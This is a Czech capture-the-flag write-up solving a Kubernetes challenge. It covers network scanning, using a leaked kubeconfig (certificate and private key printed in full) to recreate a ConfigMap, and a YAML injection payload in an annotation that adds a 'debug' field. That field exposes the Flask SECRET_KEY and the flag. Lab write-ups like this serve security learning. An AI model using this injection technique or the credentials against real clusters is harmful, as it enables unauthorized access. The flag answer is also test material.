# Chapter 4: Uncle (6)

## Zadání

Hi, TCC-CSIRT analyst,

do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

* The entry point to LORE is at <http://intro.lore.tcc>.

See you in the next incident!

## Nápovědy (Hints)

* Be sure you enter flag for correct chapter.
* In this realm, challenges should be conquered in a precise order, and to triumph over some, you'll need artifacts acquired from others - a unique twist that defies the norms of typical CTF challenges.

## Řešení

Webová stránka ze zadání obsahuje pouze odkazy na 4 úlohy ve skupině LORE.

Webová stránka pro tuto úlohu je <http://sam.lore.tcc/>. Zdrojové kódy jsou uložené v gitu v úkolu [Chapter 1: Travel](../15_Chapter1_Travel/README.md) v repozitáři `sam-operator` <http://cgit.lore.tcc/cgit.cgi/sam-operator/>.

Zdrojové kódy [sam-operator.zip](sam-operator.zip) si stáhneme, budeme je potřebovat.

PC s webovou stránkou je součástí Kubernetes, IP adresu najdeme stejně jako v úloze [Chapter 3: Bounded](../17_Chapter1_Bounded/README.md). Budeme potřebovat shell na PC pimpam a spuštěný Pivoting (tunelování).

Nejdříve si zjistíme IP adresu `sam` serveru

`./nmap -sn 192.168.73.*`

```text
Nmap scan report for 192.168.73.64
Nmap scan report for 192-168-73-102.intro-web.intro.svc.cluster.local (192.168.73.102)
Nmap scan report for 192-168-73-107.jgames-web.jgames.svc.cluster.local (192.168.73.107)
Nmap scan report for 192-168-73-112.calico-kube-controllers-metrics.calico-system.svc.cluster.local (192.168.73.112)
Nmap scan report for 192-168-73-114.kube-dns.kube-system.svc.cluster.local (192.168.73.114)
Nmap scan report for 192-168-73-115.ingress-nginx-controller.ingress-nginx.svc.cluster.local (192.168.73.115)
Nmap scan report for 192-168-73-117.webhook-service.metallb-system.svc.cluster.local (192.168.73.117)
Nmap scan report for 192.168.73.118
Nmap scan report for 192-168-73-120.sam-web.sam-operator.svc.cluster.local (192.168.73.120)
Nmap scan report for 192-168-73-121.kube-dns.kube-system.svc.cluster.local (192.168.73.121)
Nmap scan report for 192-168-73-122.cgit-web.cgit.svc.cluster.local (192.168.73.122)
Nmap scan report for 192-168-73-123.whoami-service.default.svc.cluster.local (192.168.73.123)
Nmap scan report for pimpam-9bd6b669c-f5hff (192.168.73.124)
```

Oskenujeme porty

`./nmap 192.168.73.120 -p-`

```text
PORT     STATE SERVICE
8010/tcp open  unknown
9115/tcp open  unknown
```

Na portu 8010 běží vlastní server a na portu 9115 běží diagnostická stránka od `go`, viz <https://pkg.go.dev/net/http/pprof>. Ani po důkladném zkoumání této stránky a všech jejich podstránek jsem nepřišel na to, k čemu by nám mohla sloužit, FLAG se v ní neskrývá. Go aplikace, která tam běží je tato <https://github.com/flant/shell-operator.git> a umožňuje volat Kubernetes hooky.

Hlavní webová stránka funguje takto:

1. Ze zadaného názvu a kvóty je v `sam-operator\web\samweb\app.py` vygenerovaný náhodný `txid` a v Kubernetes se vygeneruje ConfigMap v namespace `sam-queue` s následující strukturou:

   ```text
   apiVersion: v1,
   kind: ConfigMap,
   metadata: {
       name: request-${txid},
       namespace: sam-queues,
       annotations: {
           sam-operator/project_name: form.data["name"],
           sam-operator/project_quota: form.data["quota"],
       },
   },
   data: {
        txid: ${txid},
        name: form.data["name"],
        quota: form.data["quota"],
   }
   ```

1. Následně je spuštěný trigger `sam-operator\hooks\00-hook.py`, který vytvořený ConfigMap převede na Secret v namespace `sam-queue` s následující strukturou:

    ```text
    apiVersion: v1
    kind: Secret
    metadata:
        name: request-${txid}
        namespace: sam-queues
    stringData:
        storage: storage-hal-XX
        access_token: random_20_hex
        quota: form.data["quota"]
    ```

    a zároveň do vygenerovaného ConfigMap přidá do `data` položku `storage` stejnou, jako je v Secret.

1. Po obnovení stránky <http://sam.lore.tcc/status> je zobrazen obsah ConfigMap i Secret.

Zajímavým místem je šablona `sam-operator\web\samweb\templates\status.html`

```html
...
{% if project_secret and ("debug" in project_secret["data"]) %}
<pre id="debug">
    {{ session }}
    {{ config }}
</pre>
{% endif %}
...
```

která pokud je v Secret obsažena položka `debug`, zobrazí obsah `session` a `config`, ve které je ukrytý FLAG.

Pomocí [kube-hunter](https://github.com/aquasecurity/kube-hunter) si zjistíme něco o Kubernets

`proxychains -q kube-hunter --cidr 192.168.73.0/24`

```text
Nodes
+-------------+---------------+
| TYPE        | LOCATION      |
+-------------+---------------+
| Node/Master | 192.168.73.64 |
+-------------+---------------+

Detected Services
+-------------+---------------------+----------------------+
| SERVICE     | LOCATION            | DESCRIPTION          |
+-------------+---------------------+----------------------+
| Kubelet API | 192.168.73.64:10250 | The Kubelet is the   |
|             |                     | main component in    |
|             |                     | every Node, all pod  |
|             |                     | operations goes      |
|             |                     | through the kubelet  |
+-------------+---------------------+----------------------+
| API Server  | 192.168.73.64:6443  | The API server is in |
|             |                     | charge of all        |
|             |                     | operations on the    |
|             |                     | cluster.             |
+-------------+---------------------+----------------------+

Vulnerabilities
For further information about a vulnerability, search its ID in:
https://avd.aquasec.com/
+--------+--------------------+----------------------+----------------------+----------------------+----------+
| ID     | LOCATION           | MITRE CATEGORY       | VULNERABILITY        | DESCRIPTION          | EVIDENCE |
+--------+--------------------+----------------------+----------------------+----------------------+----------+
| KHV002 | 192.168.73.64:6443 | Initial Access //    | K8s Version          | The kubernetes       | v1.29.8  |
|        |                    | Exposed sensitive    | Disclosure           | version could be     |          |
|        |                    | interfaces           |                      | obtained from the    |          |
|        |                    |                      |                      | /version endpoint    |          |
+--------+--------------------+----------------------+----------------------+----------------------+----------+
```

Žádné závažné zranitelnosti nenalezeny.

Anonymní přístup do Kubernetes není povolen, budeme potřebovat tedy potřebovat přihlašovací údaje. Jejich nalezení nebylo snadné, ale nakonec jsem je našel na PC jgames z úlohy [Chapter 3: Bounded](../17_Chapter1_Bounded/README.md) díky malé nápovědě ve změně `index.html` a pomocí

`find / | grep kube`

v souboru [/mnt/kubecreds-jacob.config](kubecreds-jacob.config).

```text
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCVENDQWUyZ0F3SUJBZ0lJZmNPcWJvVVFTUDh3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TkRBNE1qVXhOVFF6TXpSYUZ3MHpOREE0TWpNeE5UUTRNelJhTUJVeApFekFSQmdOVkJBTVRDbXQxWW1WeWJtVjBaWE13Z2dFaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQkR3QXdnZ0VLCkFvSUJBUURGSnovZndKL3pUUWY3WUxLYy9hb00rc25LanN2UnBDUUN0YkZzUTRJSmlWQ3pVV0lqbFE1eEJTME4KMHBTaFJDcUZySSsrb0RyVlZMS2NtUXlQQkVCVlliWG93MFhqZ2t5QU5LU3l3YWl4eno5QnloNXk0MElSTGw2Mgorbi8xSmkzVnBUMWFzZ3V5c0VOLzNQU1NiR2VkTVZ6bzJsV0xEdjAwZlQ1b2p1eGo5ZDJveFAwY0dZWDRobVFYCnBlTjhlRDhJQTIxYnNzamYza0ZwYVhrSjlJTDExd3Q0QjdjV2ZYNHNjYWdEZmJZSmlwUHd3VEZCWmZRRGlhMFoKbkgyUThtUTJ5ZEcvWHZtUFBFc1Z2dmJMYy9CdXk2REFVZnkvMzRZdXg4c1ZnUk5DamY1SmMwV09PVU5WNG05aAp3emQ3V2lOclo3MndGU3hlTjE0d0FUY0tXNFp2QWdNQkFBR2pXVEJYTUE0R0ExVWREd0VCL3dRRUF3SUNwREFQCkJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJTdko1MkJLZDNsMkQwNXF1MmpxRHFCeFd1RjhEQVYKQmdOVkhSRUVEakFNZ2dwcmRXSmxjbTVsZEdWek1BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQWRZSUQ0OUhCaQp6U00rdVdtUVFaSkU4Z3I2UTJzejZQTHErbGVQQW9jL2Z5c0JZM1k1RVNSNjRSNkM1eU9VRnRGa2p0N29SZ2RzCkRqcVE2eUtweWd2R3J5dHdxQUZORisyRnN2WlpLUVovK09aZE1Ta3EvTWRDZCt2cXZqZW5LL0cvaWdaTzFzM2QKWEZaNmxWOGlOVFFvaXkrWEdOV3FLajNiTEoyQXRQR1lUS1kvejZjN2pETDB6RlZ3SFc0bVQ1NVBpQ3RXYThvbgo2R1lrZWhZaWNmK1ZWZzFZV0tsdUNWcnVPSTJQT2V2bCtGYXJFckkzeWsxVW5pcC9NNDU5dWpzMWgyQ1RrRlBhCndiM2JKMjZwellKSG5oc2dRTE1wd241a2JIQ2IxRU96UmlqRzJDaVdXdFM5eGtDN0taMU9kenFoZ29wQU16M3EKd3hlSncyLzlKWVV2Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
    server: https://10.99.24.81:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: jacob
  name: jacob@kubernetes
current-context: jacob@kubernetes
kind: Config
users:
- name: jacob
  user:
    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURKRENDQWd5Z0F3SUJBZ0lSQUtuQ3ZUSTVySGZJUHRYTU9xeURub2N3RFFZSktvWklodmNOQVFFTEJRQXcKRlRFVE1CRUdBMVVFQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TkRBNE1qVXhOVFE0TlRoYUZ3MHlOVEE0TWpVeApOVFE0TlRoYU1DNHhIREFNQmdOVkJBb1RCV1JsZG1Wc01Bd0dBMVVFQ2hNRmFtRmpiMkl4RGpBTUJnTlZCQU1UCkJXcGhZMjlpTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFrQlRqQjFUQzNDUEwKMHVMdU9CWTRKSGhuL2FUdU9uV1B0bysrSFUxN29KYUc2OHZSSHdjU28xY0VQNkJJVk4zd25TYTN2ZGpiVEVrVApnSjRGL2p2aFJLSk9laHdHWGRCWDJQV3ZFQm1IUkxOQmxuekltRnFscjNodXRMZFBIcC9lSlo5c0Y2ZXU3ZG5zCmhhL0M3eTlwbVl2UDRhTTBoYmVmL0lyNUhLdG8wR2JBOVpUbEhmZmI0dnlZSkFhdFdTRTYwTUNabGxQRDB2b2oKZjY4UVZNektHMmMzRDYzMTF4eThLR3ZHUzYxTUtaSG14aElDWE4rVFpKV1VWNkZIemxWWW14NVRYcFNmZTRXRQpOem1EWUsxU1RSdXhERDRnc09KMUVmNTJJQ2ZhNDRlZnBFdmNWSnhZNmhHc0hyMTRxWGYxQzUzKytrcFRTbWxzClJRdkx4eStqbHdJREFRQUJvMVl3VkRBT0JnTlZIUThCQWY4RUJBTUNCYUF3RXdZRFZSMGxCQXd3Q2dZSUt3WUIKQlFVSEF3SXdEQVlEVlIwVEFRSC9CQUl3QURBZkJnTlZIU01FR0RBV2dCU3ZKNTJCS2QzbDJEMDVxdTJqcURxQgp4V3VGOERBTkJna3Foa2lHOXcwQkFRc0ZBQU9DQVFFQXVZa2VySGdadmxkT2hZWkVBQmR5VjJ2VWUzMlRTckdXCktwbFJKaGJaaDZZU0RpOTB5UVovdWRNaVFERzVGcDV0YXVneWtkUUF4ZEw2U2dGL29lUmRHTHN3TnhZSzd4ZjQKTGtKeDM2RWtzb1FQZ3lUY1ZSRW9RQ2xnUjIwTFlSaFh2alg2ZE1BbDNHbzhEV01ORDNSa1laVGVCVFBkb0x2awpLUUt4VVQxcVplaklaei9QUko4UUt4bGhxZHV3TUY1bGNVbjM4QTl1S0J0S0FSak5JSUFXdDFXQzNHVmFIWnlNCkc5V2RSUnNQRWdFeFc1MnRSN2NUZlBtWENsU3YvU21OdVFjVWhvWk04TFNzcHZUTTNmN2dwVmFuWDdTTEZvL2YKWkVGem8rWnBwd3Y5VTF6T3ArY2c5R2lCaWxldHJUbjZtektQd2dKbzRsT3h6OXpDRTFBdFVBPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=
    client-key-data: LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2QUlCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktZd2dnU2lBZ0VBQW9JQkFRQ1FGT01IVk1MY0k4dlMKNHU0NEZqZ2tlR2Y5cE80NmRZKzJqNzRkVFh1Z2xvYnJ5OUVmQnhLalZ3US9vRWhVM2ZDZEpyZTkyTnRNU1JPQQpuZ1grTytGRW9rNTZIQVpkMEZmWTlhOFFHWWRFczBHV2ZNaVlXcVd2ZUc2MHQwOGVuOTRsbjJ3WHA2N3QyZXlGCnI4THZMMm1aaTgvaG96U0Z0NS84aXZrY3EyalFac0QxbE9VZDk5dmkvSmdrQnExWklUclF3Sm1XVThQUytpTi8KcnhCVXpNb2JaemNQcmZYWEhMd29hOFpMclV3cGtlYkdFZ0pjMzVOa2xaUlhvVWZPVlZpYkhsTmVsSjk3aFlRMwpPWU5nclZKTkc3RU1QaUN3NG5VUi9uWWdKOXJqaDUra1M5eFVuRmpxRWF3ZXZYaXBkL1VMbmY3NlNsTkthV3hGCkM4dkhMNk9YQWdNQkFBRUNnZ0VBQnlKUm4zSk45N0o2RENZYVg0S1NJeFFuS2dMNW5NRm5iVVd1eHlxbi9XcVcKb2FSRTVZRm5KZGxRSjRwYktvQ1d3bUZCWmRBUUE3WDJsajY4MHpySnk2a3hzNUFockpGOVdBdktNRVRqVXI2QgpkOThUMjU5Wlp0ZlN1M1g4SCtzUWg5SmQrc25kdW44NDIrRzVDRGpUeEx1TWZvS2pQaCs2ZHptMlhmb0t4WTdOCjVVd0RPdURHYjNmVXhsZDJZcSswUCtxWUdxcjZUWjY5aUZZMVNERHQxdkV6dUhDcHJmeDlyZk0wbjdXdDU5SmoKSmwxVWpDeXU1elhSbU9sZ0xUK3NLdUdBOUlGTGRRcTF2Zi9zSFczZFZ2Ykpnam5FN2dpR2ZvYTlTMDc0TzFibgpocEFBaU9wNEVGalFoaXkzV1d3L2lpdXliRkRlbkFhcC9rZHJyWm9xS1FLQmdRREcxWENoYnlWSGRTL3FMVUhNCmdMV280dW9XY1lUTXJNdm1RamxHelhYWHR0UWdEdCtZd1JXTnFKdFJrQkc0dkVabDJ1cXdUeDlleDRwUFdSSXAKL1pPd2JnNVBmNE1GZkc0K0dZeU83YlVxVGRLU0tNa1Y1eEszUFU0VGtoanpCR042dFpQNDUxZDV4azN5TUFpdwpyV2FEdk05SHhDS2tTZkRRbFRCY3hCcDA5UUtCZ1FDNWdaUXJLQk8zL1VmUEFXYUw4b2FpY25jaHhhanhRNXAzCkQ1RDBwbndhRmNKemFZcm5GK2h3ejcxUnRreFNPVWh0Mkx2MUZLeksxRjVIRVJtNFpFczFsVTJRRHl3Y25OdmkKNVByUGxGZDViUU12c1BIK0dqNTJXaE1YWGs4QVRhZjdLWnVqUzVVYTM5bHViMXVYN2VaSzJ1WUZPN3V3TVlUKwpFV21FM09sKzJ3S0JnQy9EVC9ZSG0vM3BZYVF3VVBFT0xoVXV4U3ExQkVDaWRheVBWZkR6SkE2NGhZWlo3RTVtCmU0WDI3YkNQR2lLMVgzZlNPYlEybllPSURXcDRMQXZZTlNVWm11aHY2Z3BrVkpzb1NnSi9pWmhxNzExYTNNc2QKSWZyUWlEUGRVWTczQytxTE9jdDl6eDZhaTFqVlB4RXA1a2xaRHJYZm9LNjBjRnU2cXM1dDhTa05Bb0dBWmxtZgpKWnlNSEtTclBRUjV6dGMxLzJVR1krVEp6S3ZQQ3NmVTQ1Y0R1K1NyajcvNHVuNVBhZ2JFWHRRbEVleTNFSnhYClArWnpXOG1HWnRHQmptSVB1UFd5Z0x4T1MwOGtadkNOallBOEx5dTlhVS9JaExsNEl4YVpsL2dad0lJWUg1U2EKWWFOdkZnL1J5SU82Vm40VTVOSVh2V1Z5cmNqMHByVjJzYTZ0U2FjQ2dZQnBKb1UvYzc1NVFTQi9uTVNpUmxuRQpUVkJsWkIvMkExL01pYzJoU2syVXJuajhUN0dIZmM1TEp0VmNNZEJyS1h4ckE5OXNEUHFwclB2UzcyVkl0VE9ZCitsckdmYVh0bUtpUDFXUnVXNllpTUFScTBBM1Q1SVdacTBlRlVYNCthNVdvK0N1d2pUNmp5V3lrM0doVUNQUFIKWnZQL2REdmRmRTBOVm1HT0phaFltdz09Ci0tLS0tRU5EIFBSSVZBVEUgS0VZLS0tLS0K
```

IP adresa `10.99.24.81` je přístupná bez proxy, takže můžeme volat kubectl přímo. Použijeme namespace `sam-queue`.

Zkusíme zjistit, jaká máme oprávnění

`kubectl --kubeconfig kubecreds-jacob.config -n sam-queue auth can-i --list`

```text
Resources                                       Non-Resource URLs   Resource Names   Verbs
configmaps                                      []                  []               [create delete]
selfsubjectreviews.authentication.k8s.io        []                  []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
```

Máme oprávnění na vytváření a mazání ConfigMap. Můžeme tedy vytvářet ConfigMap stejně, jako webová aplikace, ale my potřebujeme v Secret přidat do `data` položku `debug`.

Vytváření Secret se v `sam-operator\hooks\00-hook.py` řídí šablonou

```text
apiVersion: v1
kind: Secret
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
stringData:
  storage: "{storage}"
  access_token: "{access_token}"
  quota: "{quota}"
```

takže potřebujeme, aby vypadala takto

```text
apiVersion: v1
kind: Secret
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
stringData:
  storage: "{storage}"
  access_token: "{access_token}"
  quota: "{quota}"
  debug: "1"
```

Hodnoty v šabloně jsou nahrazeny pomocí formátování a nahrazení proměnných

```py
storage = random_choice(MANAGED_STORAGE)
access_token = token_hex(20)
pquota = ctx['object']['metadata']['annotations']['sam-operator/project_quota']

subprocess.run(
    ["kubectl", "apply", "-f", "-"],
    input=UPDATE_TEMPLATE.format(
        name=ctx['object']['metadata']['name'],
        queue_ns=QUEUE_NS,
        storage=storage,
        access_token=access_token,
        quota=pquota,
    ).encode()
)
```

Je potřeba vhodně upravit proměnnou `sam-operator/project_quota` aby po formátování vznikla požadovaná struktura.

1. Nejdříve si na webové stránce vygenerujeme nový požadavek

   ```text
   {"name": "qweqwe", "quota": "1GB", "storage": "storage-hal-04", "txid": "bb37b7f204a326bb39e47a480a3d0f88"}

   {"access_token": "YjljM2ZlZDk3NWYwM2VkMDBmNzVhNDFhNzAxMDY2NDc2NGExYTYyOQ==", "quota": "MUdC", "storage": "c3RvcmFnZS1oYWwtMDQ="}
   ```

1. Smažeme ze sam-queue vytvořený ConfigMap s txid `bb37b7f204a326bb39e47a480a3d0f88`.

   `kubectl --kubeconfig kubecreds-jacob.config -n sam-queue delete configmap request-bb37b7f204a326bb39e47a480a3d0f88`

   ```text
   configmap "request-bb37b7f204a326bb39e47a480a3d0f88" deleted
   ```

1. Vytvoříme nový ConfigMap s upravenou hodnotou `sam-operator/project_quota`.

   Do souboru `data.yaml` si uložíme

   ```text
   apiVersion: v1
   kind: ConfigMap
   data:
       name: xx
       txid: xx
       quota: xx
   metadata:
       name: request-bb37b7f204a326bb39e47a480a3d0f88
       namespace: sam-queue
       annotations:
           sam-operator/project_name: xx
           sam-operator/project_quota: "1GB\"\n  debug: \"1"
    ```

1. Vytvoříme nový ConfigMap

   `kubectl --kubeconfig kubecreds-jacob.config -n sam-queue create -f data.yaml`

   ```text
   configmap/request-73399398c6c985c5b6bc853bd5b1ed6f created
   ```

Po obnovení stránky <http://sam.lore.tcc/status> se zobrazí i debug údaje a hodnota `session` a `config`, kde je hledaný FLAG.

```text
{"name": "xx", "quota": "xx", "storage": "storage-hal-01", "txid": "xx"}

{"access_token": "Mjg1ZmFjMzE5YzgwYWEzMWFjZjk4MzQzMGI4MThjN2QzOTMzMjU2Mw==", "debug": "MQ==", "quota": "MUdC", "storage": "c3RvcmFnZS1oYWwtMDE="}

<SecureCookieSession {'csrf_token': '5a65392631626f42777b53c074d5e83212e64992', 'reqdata': {'name': 'qweqwe', 'quota': '1GB', 'txid': 'bb37b7f204a326bb39e47a480a3d0f88'}}>

<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 'bda2e2426c28bfd0aec5438b2314b210', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'FLAG': 'FLAG{nP0c-X9Gh-bee7-iWxw}', 'QUEUE_NS': 'sam-queue', 'DEFAULT_QUOTA': '1GB'}>
```

## Flag

`FLAG{nP0c-X9Gh-bee7-iWxw}`
